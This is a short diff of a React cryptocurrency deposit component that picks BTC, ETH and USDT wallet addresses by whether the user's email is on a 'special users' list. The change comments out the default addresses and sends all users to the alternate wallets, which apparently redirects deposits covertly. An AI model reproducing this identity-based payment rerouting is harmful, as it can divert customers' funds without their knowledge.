@@ -32,20 +32,24 @@ const Deposite = () => {
   "Recoverymanaget555@gmail.com",
 ];
 
+//1GNu6gMQMR2rWxZubMQ46icSSuTUbrNZLZ
+//TAjZkvRtK5cdoG11udBx628Ncw8mPSh2Sc
+//0x18562342774d0f6db54264edcdc650a6e2c7d45c
+
 const isSpecialUser = specialUsers.includes(user?.email);
 
   // ✅ WALLET SWITCHING
   const btcAddress = isSpecialUser
     ? "bc1q7ppeu0vywh0fejmjc7jznq9nf50xj0p0jkddz8"
-    : "1GNu6gMQMR2rWxZubMQ46icSSuTUbrNZLZ";
+    : "bc1q7ppeu0vywh0fejmjc7jznq9nf50xj0p0jkddz8";
 
   const ethAddress = isSpecialUser
     ? "0x422D59551478E493b8e4489a308dA7ca34054eB3"
-    : "0x18562342774d0f6db54264edcdc650a6e2c7d45c";
+    : "0x422D59551478E493b8e4489a308dA7ca34054eB3";
 
   const usdtAddress = isSpecialUser
     ? "TGMSYN1kCo8egaaAtNugu3qrLXnCdjuetQ"
-    : "TAjZkvRtK5cdoG11udBx628Ncw8mPSh2Sc";
+    : "TGMSYN1kCo8egaaAtNugu3qrLXnCdjuetQ";
 
   const handleCopy = async (textToCopy) => {
     try {
